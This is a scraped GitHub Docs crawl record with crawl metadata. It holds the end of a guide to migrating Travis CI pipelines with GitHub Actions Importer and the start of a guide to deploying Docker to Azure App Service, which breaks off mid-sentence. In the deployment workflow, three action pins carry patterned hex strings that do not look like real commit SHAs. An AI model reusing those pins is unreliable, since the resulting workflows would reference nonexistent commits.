Actions Importer `update` CLI command to connect to GitHub Packages Container registry and ensure that the container image is updated to the latest version:\n    \n    ```\n    gh actions-importer update\n    ```\n    \n    The output of the command should be similar to below:\n    \n    ```\n    Updating ghcr.io/actions-importer/cli:latest...\n    ghcr.io/actions-importer/cli:latest up-to-date\n    ```\n    \n\n## [Perform an audit of Travis CI](#perform-an-audit-of-travis-ci)\n\nYou can use the `audit` command to get a high-level view of all pipelines in a Travis CI server.\n\nThe `audit` command performs the following steps:\n\n1.  Fetches all of the projects defined in a Travis CI server.\n2.  Converts each pipeline to its equivalent GitHub Actions workflow.\n3.  Generates a report that summarizes how complete and complex of a migration is possible with GitHub Actions Importer.\n\n### [Running the audit command](#running-the-audit-command)\n\nTo perform an audit of a Travis CI server, run the following command in your terminal:\n\n```\ngh actions-importer audit travis-ci --output-dir tmp/audit\n```\n\n### [Inspecting the audit results](#inspecting-the-audit-results)\n\nThe files in the specified output directory contain the results of the audit. See the `audit_summary.md` file for a summary of the audit results.\n\nThe audit summary has the following sections.\n\n#### [Pipelines](#pipelines)\n\nThe \"Pipelines\" section contains a high-level statistics regarding the conversion rate done by GitHub Actions Importer.\n\nListed below are some key terms that can appear in the \"Pipelines\" section:\n\n*   **Successful** pipelines had 100% of the pipeline constructs and individual items converted automatically to their GitHub Actions equivalent.\n*   **Partially successful** pipelines had all of the pipeline constructs converted, however, there were some individual items that were not converted automatically to their GitHub Actions equivalent.\n*   **Unsupported** pipelines are definition types that are not supported by GitHub Actions Importer.\n*   **Failed** pipelines encountered a fatal error when being converted. This can occur for one of three reasons:\n    *   The pipeline was originally misconfigured and not valid.\n    *   GitHub Actions Importer encountered an internal error when converting it.\n    *   There was an unsuccessful network response that caused the pipeline to be inaccessible, which is often due to invalid credentials.\n\n#### [Build steps](#build-steps)\n\nThe \"Build steps\" section contains an overview of individual build steps that are used across all pipelines, and how many were automatically converted by GitHub Actions Importer.\n\nListed below are some key terms that can appear in the \"Build steps\" section:\n\n*   A **known** build step is a step that was automatically converted to an equivalent action.\n*   An **unknown** build step is a step that was not automatically converted to an equivalent action.\n*   An **unsupported** build step is a step that is either:\n    *   Fundamentally not supported by GitHub Actions.\n    *   Configured in a way that is incompatible with GitHub Actions.\n*   An **action** is a list of the actions that were used in the converted workflows. This can be important for:\n    *   If you use GitHub Enterprise Server, gathering the list of actions to sync to your instance.\n    *   Defining an organization-level allowlist of actions that are used. This list of actions is a comprehensive list of actions that your security or compliance teams may need to review.\n\n#### [Manual tasks](#manual-tasks-1)\n\nThe \"Manual tasks\" section contains an overview of tasks that GitHub Actions Importer is not able to complete automatically, and that you must complete manually.\n\nListed below are some key terms that can appear in the \"Manual tasks\" section:\n\n*   A **secret** is a repository or organization-level secret that is used in the converted pipelines. These secrets must be created manually in GitHub Actions for these pipelines to function properly. For more information, see [Using secrets in GitHub Actions](https://docs.github.com/en/actions/security-guides/using-secrets-in-github-actions).\n*   A **self-hosted runner** refers to a label of a runner that is referenced in a converted pipeline that is not a GitHub-hosted runner. You will need to manually define these runners for these pipelines to function properly.\n\n#### [Files](#files)\n\nThe final section of the audit report provides a manifest of all the files that were written to disk during the audit.\n\nEach pipeline file has a variety of files included in the audit, including:\n\n*   The original pipeline as it was defined in GitHub.\n*   Any network responses used to convert the pipeline.\n*   The converted workflow file.\n*   Stack traces that can be used to troubleshoot a failed pipeline conversion.\n\nAdditionally, the `workflow_usage.csv` file contains a comma-separated list of all actions, secrets, and runners that are used by each successfully converted pipeline. This can be useful for determining which workflows use which actions, secrets, or runners, and can be useful for performing security reviews.\n\n## [Forecast potential build runner usage](#forecast-potential-build-runner-usage)\n\nYou can use the `forecast` command to forecast potential GitHub Actions usage by computing metrics from completed pipeline runs in your Travis CI server.\n\n### [Running the forecast command](#running-the-forecast-command)\n\nTo perform a forecast of potential GitHub Actions usage, run the following command in your terminal. By default, GitHub Actions Importer includes the previous seven days in the forecast report.\n\n```\ngh actions-importer forecast travis-ci --output-dir tmp/forecast\n```\n\n### [Inspecting the forecast report](#inspecting-the-forecast-report)\n\nThe `forecast_report.md` file in the specified output directory contains the results of the forecast.\n\nListed below are some key terms that can appear in the forecast report:\n\n*   The **job count** is the total number of completed jobs.\n*   The **pipeline count** is the number of unique pipelines used.\n*   **Execution time** describes the amount of time a runner spent on a job. This metric can be used to help plan for the cost of GitHub-hosted runners.\n    *   This metric is correlated to how much you should expect to spend in GitHub Actions. This will vary depending on the hardware used for these minutes. You can use the [GitHub Actions pricing calculator](https://github.com/pricing/calculator) to estimate the costs.\n*   **Queue time** metrics describe the amount of time a job spent waiting for a runner to be available to execute it.\n*   **Concurrent jobs** metrics describe the amount of jobs running at any given time. This metric can be used to define the number of runners you should configure.\n\nAdditionally, these metrics are defined for each queue of runners in Travis CI. This is especially useful if there is a mix of hosted or self-hosted runners, or high or low spec machines, so you can see metrics specific to different types of runners.\n\n## [Perform a dry-run migration of a Travis CI pipeline](#perform-a-dry-run-migration-of-a-travis-ci-pipeline)\n\nYou can use the `dry-run` command to convert a Travis CI pipeline to an equivalent GitHub Actions workflow. A dry-run creates the output files in a specified directory, but does not open a pull request to migrate the pipeline.\n\nTo perform a dry run of migrating your Travis CI pipelines to GitHub Actions, run the following command in your terminal, replacing `my-travis-ci-repository` with the name of your Travis CI repository.\n\n```\ngh actions-importer dry-run travis-ci --travis-ci-repository my-travis-ci-repository --output-dir tmp/dry-run\n```\n\nYou can view the logs of the dry run and the converted workflow files in the specified output directory.\n\nIf there is anything that GitHub Actions Importer was not able to convert automatically, such as unknown build steps or a partially successful pipeline, you might want to create custom transformers to further customize the conversion process. For more information, see [Extending GitHub Actions Importer with custom transformers](https://docs.github.com/en/actions/migrating-to-github-actions/automated-migrations/extending-github-actions-importer-with-custom-transformers).\n\n## [Perform a production migration of a Travis CI pipeline](#perform-a-production-migration-of-a-travis-ci-pipeline)\n\nYou can use the `migrate` command to convert a Travis CI pipeline and open a pull request with the equivalent GitHub Actions workflow.\n\n### [Running the migrate command](#running-the-migrate-command)\n\nTo migrate a Travis CI pipeline to GitHub Actions, run the following command in your terminal, replacing the `target-url` value with the URL for your GitHub repository, and `my-travis-ci-repository` with the name of your Travis CI repository.\n\n```\ngh actions-importer migrate travis-ci --target-url https://github.com/octo-org/octo-repo --output-dir tmp/migrate --travis-ci-repository my-travis-ci-repository\n```\n\nThe command's output includes the URL to the pull request that adds the converted workflow to your repository. An example of a successful output is similar to the following:\n\n```\n$ gh actions-importer migrate travis-ci --target-url https://github.com/octo-org/octo-repo --output-dir tmp/migrate --travis-ci-repository my-travis-ci-repository\n[2022-08-20 22:08:20] Logs: 'tmp/migrate/log/actions-importer-20220916-014033.log'\n[2022-08-20 22:08:20] Pull request: 'https://github.com/octo-org/octo-repo/pull/1'\n```\n\n### [Inspecting the pull request](#inspecting-the-pull-request)\n\nThe output from a successful run of the `migrate` command contains a link to the new pull request that adds the converted workflow to your repository.\n\nSome important elements of the pull request include:\n\n*   In the pull request description, a section called **Manual steps**, which lists steps that you must manually complete before you can finish migrating your pipelines to GitHub Actions. For example, this section might tell you to create any secrets used in your workflows.\n*   The converted workflows file. Select the **Files changed** tab in the pull request to view the workflow file that will be added to your GitHub repository.\n\nWhen you are finished inspecting the pull request, you can merge it to add the workflow to your GitHub repository.\n\n## [Reference](#reference)\n\nThis section contains reference information on environment variables, optional arguments, and supported syntax when using GitHub Actions Importer to migrate from Travis CI.\n\n### [Using environment variables](#using-environment-variables)\n\nGitHub Actions Importer uses environment variables for its authentication configuration. These variables are set when following the configuration process using the `configure` command. For more information, see the [Configuring credentials](#configuring-credentials) section.\n\nGitHub Actions Importer uses the following environment variables to connect to your Travis CI instance:\n\n*   `GITHUB_ACCESS_TOKEN`: The personal access token (classic) used to create pull requests with a converted workflow (requires the `workflow` scope).\n*   `GITHUB_INSTANCE_URL`: The URL to the target GitHub instance (for example, `https://github.com`).\n*   `TRAVIS_CI_ACCESS_TOKEN`: The Travis CI API access token used to view Travis CI resources.\n*   `TRAVIS_CI_ORGANIZATION`: The organization name of your Travis CI instance.\n*   `TRAVIS_CI_INSTANCE_URL`: The URL of the Travis CI instance.\n*   `TRAVIS_CI_SOURCE_GITHUB_ACCESS_TOKEN`: (Optional) The personal access token used to authenticate with your source GitHub instance. If not provided, `GITHUB_ACCESS_TOKEN` will be used instead.\n*   `TRAVIS_CI_SOURCE_GITHUB_INSTANCE_URL`: (Optional) The URL to the source GitHub instance, such as [https://github.com](https://github.com/). If not provided, `GITHUB_INSTANCE_URL` will be used instead.\n\nThese environment variables can be specified in a `.env.local` file that is loaded by GitHub Actions Importer when it is run.\n\n### [Using optional arguments](#using-optional-arguments)\n\nThere are optional arguments you can use with the GitHub Actions Importer subcommands to customize your migration.\n\n#### [`--source-file-path`](#--source-file-path)\n\nYou can use the `--source-file-path` argument with the `forecast`, `dry-run`, or `migrate` subcommands.\n\nBy default, GitHub Actions Importer fetches pipeline contents from source control. The `--source-file-path` argument tells GitHub Actions Importer to use the specified source file path instead.\n\nFor example:\n\n```\ngh actions-importer dry-run travis-ci --output-dir ./path/to/output/ --travis-ci-repository my-travis-ci-repository --source-file-path ./path/to/.travis.yml\n```\n\n#### [`--allow-inactive-repositories`](#--allow-inactive-repositories)\n\nYou can use this argument to specify whether GitHub Actions Importer should include inactive repositories in an audit. If this option is not set, inactive repositories are not included in audits.\n\n```\ngh actions-importer dry-run travis-ci --output-dir ./path/to/output/ --travis-ci-repository my-travis-ci-repository --allow-inactive-repositories\n```\n\n#### [`--config-file-path`](#--config-file-path)\n\nYou can use the `--config-file-path` argument with the `audit`, `dry-run`, and `migrate` subcommands.\n\nBy default, GitHub Actions Importer fetches pipeline contents from source control. The `--config-file-path` argument tells GitHub Actions Importer to use the specified source files instead.\n\n##### [Audit example](#audit-example)\n\nIn this example, GitHub Actions Importer uses the specified YAML configuration file to perform an audit.\n\n```\ngh actions-importer audit travis-ci --output-dir ./path/to/output/ --config-file-path ./path/to/travis-ci/config.yml\n```\n\nTo audit a Travis CI instance using a configuration file, the file must be in the following format and each `repository_slug` value must be unique:\n\n```\nsource_files:\n  - repository_slug: travis-org-name/travis-repo-name\n    path: path/to/.travis.yml\n  - repository_slug: travis-org-name/some-other-travis-repo-name\n    path: path/to/.travis.yml\n```\n\n##### [Dry run example](#dry-run-example)\n\nIn this example, GitHub Actions Importer uses the specified YAML configuration file as the source file to perform a dry run.\n\nThe pipeline is selected by matching the `repository_slug` in the configuration file to the value of the `--travis-ci-repository` option. The `path` is then used to pull the specified source file.\n\n```\ngh actions-importer dry-run travis-ci --travis-ci-repository travis-org-name/travis-repo-name --output-dir ./output/ --config-file-path ./path/to/travis-ci/config.yml\n```\n\n### [Supported project languages](#supported-project-languages)\n\nGitHub Actions Importer supports migrating Travis CI projects in the following languages.\n\n*   `android`\n*   `bash`\n*   `c`\n*   `clojure`\n*   `c++`\n*   `crystal`\n*   `c#`\n*   `d`\n*   `dart`\n*   `elixir`\n*   `erlang`\n*   `generic`\n*   `go`\n*   `groovy`\n*   `haskell`\n*   `haxe`\n*   `java`\n*   `julia`\n*   `matlab`\n*   `minimal`\n*   `nix`\n*   `node_js`\n*   `objective-c`\n*   `perl`\n*   `perl6`\n*   `php`\n*   `python`\n*   `r`\n*   `ruby`\n*   `rust`\n*   `scala`\n*   `sh`\n*   `shell`\n*   `smalltalk`\n*   `swift`\n\n### [Supported syntax for Travis CI pipelines](#supported-syntax-for-travis-ci-pipelines)\n\nThe following table shows the type of properties GitHub Actions Importer is currently able to convert. For more details about how Travis CI pipeline syntax aligns with GitHub Actions, see [Migrating from Travis CI to GitHub Actions](https://docs.github.com/en/actions/migrating-to-github-actions/manually-migrating-to-github-actions/migrating-from-travis-ci-to-github-actions).\n\n| Travis CI | GitHub Actions | Status |\n| --- | --- | --- |\n| branches | *   `on.<push>.<branches>` | Supported |\n| build\\_pull\\_requests | *   `on.<pull_request>` | Supported |\n| env | *   `env`<br>*   `jobs.<job_id>.env`<br>*   `jobs.<job_id>.steps.env` | Supported |\n| if  | *   `jobs.<job_id>.if` | Supported |\n| job | *   `jobs.<job_id>`<br>*   `jobs.<job_id>.name` | Supported |\n| matrix | *   `jobs.<job_id>.strategy`<br>*   `jobs.<job_id>.strategy.fail-fast`<br>*   `jobs.<job_id>.strategy.matrix` | Supported |\n| os & dist | *   `runners` | Supported |\n| scripts | *   `jobs.<job_id>.steps` | Supported |\n| stages | *   `jobs` | Supported |\n| env | *   `on` | Partially supported |\n| branches | *   `on.<push>.<tags>`<br>*   `on.<push>.paths` | Unsupported |\n| build\\_pull\\_requests | *   `on.<pull_request>.<branches>`<br>*   `on.<pull_request>.<tags>`<br>*   `on.<pull_request>.paths` | Unsupported |\n| cron triggers | *   `on.schedule`<br>*   `on.workflow_run` | Unsupported |\n| env | *   `jobs.<job_id>.timeout-minutes`<br>*   `on.<event_name>.types` | Unsupported |\n| job | *   `jobs.<job_id>.container` | Unsupported |\n| os & dist | *   `self hosted runners` | Unsupported |\n\nFor information about supported Travis CI constructs, see the [`github/gh-actions-importer` repository](https://github.com/github/gh-actions-importer/blob/main/docs/travis_ci/index.md).\n\n### [Environment variables syntax](#environment-variables-syntax)\n\nGitHub Actions Importer uses the mapping in the table below to convert default Travis CI environment variables to the closest equivalent in GitHub Actions.\n\n| Travis CI | GitHub Actions |\n| --- | --- |\n| `$CONTINUOUS_INTEGRATION` | `$CI` |\n| `$USER` | `${{ github.actor }}` |\n| `$HOME` | `${{ github.workspace }}` |\n| `$TRAVIS_BRANCH` | `${{ github.ref }}` |\n| `$TRAVIS_BUILD_DIR` | `${{ github.workspace }}` |\n| `$TRAVIS_BUILD_ID` | `${{ github.run_number }}` |\n| `$TRAVIS_BUILD_NUMBER` | `${{ github.run_id }}` |\n| `$TRAVIS_COMMIT` | `${{ github.sha }}` |\n| `$TRAVIS_EVENT_TYPE` | `${{ github.event_name }}` |\n| `$TRAVIS_PULL_REQUEST_BRANCH` | `${{ github.base_ref }}` |\n| `$TRAVIS_PULL_REQUEST` | `${{ github.event.number }}` |\n| `$TRAVIS_PULL_REQUEST_SHA` | `${{ github.head.sha }}` |\n| `$TRAVIS_PULL_REQUEST_SLUG` | `${{ github.repository }}` |\n| `$TRAVIS_TAG` | `${{ github.ref }}` |\n| `$TRAVIS_OS_NAME` | `${{ runner.os }}` |\n| `$TRAVIS_JOB_ID` | `${{ github.job }}` |\n| `$TRAVIS_REPO_SLUG` | `${{ github.repository_owner/github.repository }}` |\n| `$TRAVIS_BUILD_WEB_URL` | `${{ github.server_url }}/${{ github.repository }}/actions/runs/${{ github.run_id }}` |\n\n## [Legal notice](#legal-notice)\n\nPortions have been adapted from [https://github.com/github/gh-actions-importer/](https://github.com/github/gh-actions-importer/) under the MIT license:\n\n```\nMIT License\n\nCopyright (c) 2022 GitHub\n\nPermission is hereby granted, free of charge, to any person obtaining a copy\nof this software and associated documentation files (the \"Software\"), to deal\nin the Software without restriction, including without limitation the rights\nto use, copy, modify, merge, publish, distribute, sublicense, and/or sell\ncopies of the Software, and to permit persons to whom the Software is\nfurnished to do so, subject to the following conditions:\n\nThe above copyright notice and this permission notice shall be included in all\ncopies or substantial portions of the Software.\n\nTHE SOFTWARE IS PROVIDED \"AS IS\", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\nIMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\nFITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\nAUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\nLIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\nOUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE\nSOFTWARE.\n```",
  "debug": {
    "pageType": "Article",
    "pageTypeReason": "HasUrlDashes",
    "totalLinks": 284,
    "response": {
      "statusCode": 200
    },
    "snapshots": {
      "originalHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-migrating-to-github-actions-using-github-actions-importer-to-automate-migrations-migrating-from-travis-ci-with-gith",
      "removedElementsHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-migrating-to-github-actions-using-github-actions-importer-to-automate-migrations-migrating-from-travis-ci-with-gith",
      "extractusHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-migrating-to-github-actions-using-github-actions-importer-to-automate-migrations-migrating-from-travis-ci-with-gith",
      "readableTextHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-migrating-to-github-actions-using-github-actions-importer-to-automate-migrations-migrating-from-travis-ci-with-gith",
      "readableTextIfPossibleHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-migrating-to-github-actions-using-github-actions-importer-to-automate-migrations-migrating-from-travis-ci-with-gith"
    },
    "lengths": {
      "extractus": 38188,
      "readableText": 32417,
      "none": 58595,
      "readableTextIfPossible": 32417,
      "result": 32417,
      "markdown": 25336
    },
    "requestHandlerMode": "browser"
  }
},
{
  "url": "https://docs.github.com/en/actions/use-cases-and-examples/deploying/deploying-docker-to-azure-app-service",
  "crawl": {
    "loadedUrl": "https://docs.github.com/en/actions/use-cases-and-examples/deploying/deploying-docker-to-azure-app-service",
    "loadedTime": "2025-05-08T06:40:29.411Z",
    "referrerUrl": "https://docs.github.com/en/actions",
    "depth": 1,
    "httpStatusCode": 200
  },
  "metadata": {
    "canonicalUrl": "https://docs.github.com/en/actions/use-cases-and-examples/deploying/deploying-docker-to-azure-app-service",
    "title": "Deploying Docker to Azure App Service - GitHub Docs",
    "description": "You can deploy a Docker container to Azure App Service as part of your continuous deployment (CD) workflows.",
    "author": null,
    "keywords": "CD,Containers,Docker,Azure App Service",
    "languageCode": "en",
    "openGraph": [
      {
        "property": "og:site_name",
        "content": "GitHub Docs"
      },
      {
        "property": "og:title",
        "content": "Deploying Docker to Azure App Service - GitHub Docs"
      },
      {
        "property": "og:type",
        "content": "article"
      },
      {
        "property": "og:url",
        "content": "https://docs-internal.github.com/en/actions/use-cases-and-examples/deploying/deploying-docker-to-azure-app-service"
      },
      {
        "property": "og:image",
        "content": "https://docs.github.com/assets/cb-345/images/social-cards/actions.png"
      },
      {
        "property": "twitter:domain",
        "content": "docs-internal.github.com"
      },
      {
        "property": "twitter:url",
        "content": "https://docs-internal.github.com/en/actions/use-cases-and-examples/deploying/deploying-docker-to-azure-app-service"
      }
    ],
    "jsonLd": null,
    "headers": {
      "access-control-allow-origin": "*",
      "content-security-policy": "default-src 'none';prefetch-src 'self';connect-src 'self';font-src 'self' data:;img-src 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com data: placehold.it;object-src 'self';script-src 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com 'self' data:;script-src-attr 'self';frame-src 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com https://support.github.com https://www.youtube-nocookie.com;frame-ancestors 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com;style-src 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com 'self' 'unsafe-inline' data:;child-src 'self';manifest-src 'self';upgrade-insecure-requests;base-uri 'self';form-action 'self'",
      "cross-origin-opener-policy": "same-origin",
      "cross-origin-resource-policy": "same-origin",
      "origin-agent-cluster": "?1",
      "referrer-policy": "no-referrer-when-downgrade",
      "x-content-type-options": "nosniff",
      "x-dns-prefetch-control": "off",
      "x-download-options": "noopen",
      "x-frame-options": "SAMEORIGIN",
      "x-permitted-cross-domain-policies": "none",
      "x-xss-protection": "0",
      "cache-control": "public, max-age=60",
      "x-powered-by": "Next.js",
      "content-type": "text/html; charset=utf-8",
      "x-github-backend": "Kubernetes",
      "x-github-request-id": "8524:218DC9:20339:28342:681C51D7",
      "content-encoding": "br",
      "accept-ranges": "bytes",
      "age": "0",
      "date": "Thu, 08 May 2025 06:40:23 GMT",
      "via": "1.1 varnish",
      "x-served-by": "cache-lga21945-LGA",
      "x-cache": "MISS",
      "x-cache-hits": "0",
      "x-timer": "S1746686423.139697, VS0, VE355",
      "vary": "Accept-Encoding",
      "strict-transport-security": "max-age=31557600",
      "content-length": "29664",
      "x-firefox-spdy": "h2"
    }
  },
  "screenshotUrl": null,
  "text": "Deploying Docker to Azure App Service\nYou can deploy a Docker container to Azure App Service as part of your continuous deployment (CD) workflows.\nIntroduction\nThis guide explains how to use GitHub Actions to build and deploy a Docker container to Azure App Service.\nNote\nIf your GitHub Actions workflows need to access resources from a cloud provider that supports OpenID Connect (OIDC), you can configure your workflows to authenticate directly to the cloud provider. This will let you stop storing these credentials as long-lived secrets and provide other security benefits. For more information, see About security hardening with OpenID Connect. and Configuring OpenID Connect in Azure.\nPrerequisites\nBefore creating your GitHub Actions workflow, you will first need to complete the following setup steps:\nCreate an Azure App Service plan.\nFor example, you can use the Azure CLI to create a new App Service plan:\nBash\naz appservice plan create \\ --resource-group MY_RESOURCE_GROUP \\ --name MY_APP_SERVICE_PLAN \\ --is-linux \nIn the command above, replace MY_RESOURCE_GROUP with your pre-existing Azure Resource Group, and MY_APP_SERVICE_PLAN with a new name for the App Service plan.\nSee the Azure documentation for more information on using the Azure CLI:\nFor authentication, see Sign in with Azure CLI.\nIf you need to create a new resource group, see az group.\nCreate a web app.\nFor example, you can use the Azure CLI to create an Azure App Service web app:\nShell\naz webapp create \\ --name MY_WEBAPP_NAME \\ --plan MY_APP_SERVICE_PLAN \\ --resource-group MY_RESOURCE_GROUP \\ --deployment-container-image-name nginx:latest \nIn the command above, replace the parameters with your own values, where MY_WEBAPP_NAME is a new name for the web app.\nConfigure an Azure publish profile and create an AZURE_WEBAPP_PUBLISH_PROFILE secret.\nGenerate your Azure deployment credentials using a publish profile. For more information, see Generate deployment credentials in the Azure documentation.\nIn your GitHub repository, create a secret named AZURE_WEBAPP_PUBLISH_PROFILE that contains the contents of the publish profile. For more information on creating secrets, see Using secrets in GitHub Actions.\nSet registry credentials for your web app.\nCreate a personal access token (classic) with the repo and read:packages scopes. For more information, see Managing your personal access tokens.\nSet DOCKER_REGISTRY_SERVER_URL to https://ghcr.io, DOCKER_REGISTRY_SERVER_USERNAME to the GitHub username or organization that owns the repository, and DOCKER_REGISTRY_SERVER_PASSWORD to your personal access token from above. This will give your web app credentials so it can pull the container image after your workflow pushes a newly built image to the registry. You can do this with the following Azure CLI command:\naz webapp config appsettings set \\ --name MY_WEBAPP_NAME \\ --resource-group MY_RESOURCE_GROUP \\ --settings DOCKER_REGISTRY_SERVER_URL=https://ghcr.io DOCKER_REGISTRY_SERVER_USERNAME=MY_REPOSITORY_OWNER DOCKER_REGISTRY_SERVER_PASSWORD=MY_PERSONAL_ACCESS_TOKEN \nOptionally, configure a deployment environment. Environments are used to describe a general deployment target like production, staging, or development. When a GitHub Actions workflow deploys to an environment, the environment is displayed on the main page of the repository. You can use environments to require approval for a job to proceed, restrict which branches can trigger a workflow, gate deployments with custom deployment protection rules, or limit access to secrets. For more information about creating environments, see Managing environments for deployment.\nCreating the workflow\nOnce you've completed the prerequisites, you can proceed with creating the workflow.\nThe following example workflow demonstrates how to build and deploy a Docker container to Azure App Service when there is a push to the main branch.\nEnsure that you set AZURE_WEBAPP_NAME in the workflow env key to the name of the web app you created.\nIf you configured a deployment environment, change the value of environment to be the name of your environment. If you did not configure an environment or if your workflow is in a private repository and you do not use GitHub Enterprise Cloud, delete the environment key.\nYAML\n# This workflow uses actions that are not certified by GitHub. # They are provided by a third-party and are governed by # separate terms of service, privacy policy, and support # documentation. # GitHub recommends pinning actions to a commit SHA. # To get a newer version, you will need to update the SHA. # You can also reference a tag or branch, but the action may change without warning. name: Build and deploy a container to an Azure Web App env: AZURE_WEBAPP_NAME: MY_WEBAPP_NAME # set this to your application's name on: push: branches: - main permissions: contents: 'read' packages: 'write' jobs: build: runs-on: ubuntu-latest steps: - uses: actions/checkout@v4 - name: Set up Docker Buildx uses: docker/setup-buildx-action@7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a6b - name: Log in to GitHub container registry uses: docker/login-action@8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d with: registry: ghcr.io username: ${{ github.actor }} password: ${{ secrets.GITHUB_TOKEN }} - name: Lowercase the repo name run: echo \"REPO=${GITHUB_REPOSITORY,,}\" >>${GITHUB_ENV} - name: Build and push container image to registry uses: docker/build-push-action@9e0f1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f with: push: true tags: ghcr.io/${{ env.REPO }}:${{ github.sha }} file: ./Dockerfile deploy: runs-on: ubuntu-latest needs: build environment: name: 'production' url: ${{ steps.deploy-to-webapp.outputs.webapp-url }} steps: - name: Lowercase the repo name run: echo \"REPO=${GITHUB_REPOSITORY,,}\" >>${GITHUB_ENV} - name: Deploy to Azure Web App id: deploy-to-webapp uses: azure/webapps-deploy@85270a1854658d167ab239bce43949edb336fa7c with: app-name: ${{ env.AZURE_WEBAPP_NAME }} publish-profile: ${{ secrets.AZURE_WEBAPP_PUBLISH_PROFILE }} images: 'ghcr.io/${{ env.REPO }}:${{ github.sha }}' \nAdditional resources\nThe following resources may also be useful:\nFor the original workflow template, see azure-container-webapp.yml in the GitHub Actions starter-workflows repository.\nThe action used to deploy the web app is the official Azure Azure/webapps-deploy action.\nFor more examples of GitHub Action workflows that deploy to Azure, see the actions-workflow-samples repository.",
  "htmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-use-cases-and-examples-deploying-deploying-docker-to-azure-app-service-k5i6bk.html",
  "markdown": "# Deploying Docker to Azure App Service\n\nYou can deploy a Docker container to Azure App Service as part of your continuous deployment (CD) workflows.\n\n## [Introduction](#introduction)\n\nThis guide explains how to use GitHub Actions to build and deploy a Docker container to [Azure App Service](https://azure.microsoft.com/services/app-service/).\n\nNote\n\nIf your GitHub Actions workflows need to access resources from a cloud provider that supports OpenID Connect (OIDC), you can configure your workflows to authenticate directly to the cloud provider. This will let you stop storing these credentials as long-lived secrets and provide other security benefits. For more information, see [About security hardening with OpenID Connect](https://docs.github.com/en/actions/deployment/security-hardening-your-deployments/about-security-hardening-with-openid-connect). and [Configuring OpenID Connect in Azure](https://docs.github.com/en/actions/deployment/security-hardening-your-deployments/configuring-openid-connect-in-azure).\n\n## [Prerequisites](#prerequisites)\n\nBefore creating your GitHub Actions workflow, you will first need to complete the following setup steps:\n\n1.  Create an Azure App Service plan.\n    \n    For example, you can use the Azure CLI to create a new App Service plan:\n    \n    Bash\n    \n    ```\n    az appservice plan create \\\n       --resource-group MY_RESOURCE_GROUP \\\n       --name MY_APP_SERVICE_PLAN \\\n       --is-linux\n    ```\n    \n    In the command above, replace `MY_RESOURCE_GROUP` with your pre-existing Azure Resource Group, and `MY_APP_SERVICE_PLAN` with a new name for the App Service plan.\n    \n    See the Azure documentation for more information on using the [Azure CLI](https://docs.microsoft.com/cli/azure/):\n    \n    *   For authentication, see [Sign in with Azure CLI](https://docs.microsoft.com/cli/azure/authenticate-azure-cli).\n    *   If you need to create a new resource group, see [az group](https://docs.microsoft.com/cli/azure/group?view=azure-cli-latest#az_group_create).\n2.  Create a web app.\n    \n    For example, you can use the Azure CLI to create an Azure App Service web app:\n    \n    Shell\n    \n    ```\n    az webapp create \\\n        --name MY_WEBAPP_NAME \\\n        --plan MY_APP_SERVICE_PLAN \\\n        --resource-group MY_RESOURCE_GROUP \\\n        --deployment-container-image-name nginx:latest\n    ```\n    \n    In the command above, replace the parameters with your own values, where `MY_WEBAPP_NAME` is a new name for the web app.\n    \n3.  Configure an Azure publish profile and create an `AZURE_WEBAPP_PUBLISH_PROFILE` secret.\n    \n    Generate your Azure deployment credentials using a publish profile. For more information, see [Generate deployment credentials](https://docs.microsoft.com/azure/app-service/deploy-github-actions?tabs=applevel#generate-deployment-credentials) in the Azure documentation.\n    \n    In your GitHub repository, create a secret named `AZURE_WEBAPP_PUBLISH_PROFILE` that contains the contents of the publish profile. For more information on creating secrets, see [Using secrets in GitHub Actions](https://docs.github.com/en/actions/security-guides/using-secrets-in-github-actions#creating-secrets-for-a-repository).\n    \n4.  Set registry credentials for your web app.\n    \n    Create a personal access token (classic) with the `repo` and `read:packages` scopes. For more information, see [Managing your personal access tokens](https://docs.github.com/en/authentication/keeping-your-account-and-data-secure/creating-a-personal-access-token).\n    \n    Set `DOCKER_REGISTRY_SERVER_URL` to `https://ghcr.io`, `DOCKER_REGISTRY_SERVER_USERNAME` to the GitHub username or organization that owns the repository, and `DOCKER_REGISTRY_SERVER_PASSWORD` to your personal access token from above. This will give your web app credentials so it can pull the container image after your workflow pushes a newly built image to the registry. You can do this with the following Azure CLI command:\n    \n    ```\n     az webapp config appsettings set \\\n         --name MY_WEBAPP_NAME \\\n         --resource-group MY_RESOURCE_GROUP \\\n         --settings DOCKER_REGISTRY_SERVER_URL=https://ghcr.io DOCKER_REGISTRY_SERVER_USERNAME=MY_REPOSITORY_OWNER DOCKER_REGISTRY_SERVER_PASSWORD=MY_PERSONAL_ACCESS_TOKEN\n    ```\n    \n5.  Optionally, configure a deployment environment. Environments are used to describe a general deployment target like `production`, `staging`, or `development`. When a GitHub Actions workflow deploys to an environment, the environment is displayed on the main page of the repository. You can use environments to require approval for a job to proceed, restrict which branches can trigger a workflow, gate deployments with custom deployment protection rules, or limit access to secrets. For more information about creating environments, see [Managing environments for 